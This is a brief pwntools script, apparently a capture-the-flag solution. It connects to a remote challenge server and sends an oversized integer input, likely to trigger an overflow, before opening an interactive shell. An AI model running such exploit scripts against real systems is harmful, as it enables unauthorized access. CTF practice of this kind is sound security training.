from pwn import *

#a=process("./pwn")
a=remote("123.56.132.194",2080)
a.sendline("2 2148080171")
a.interactive()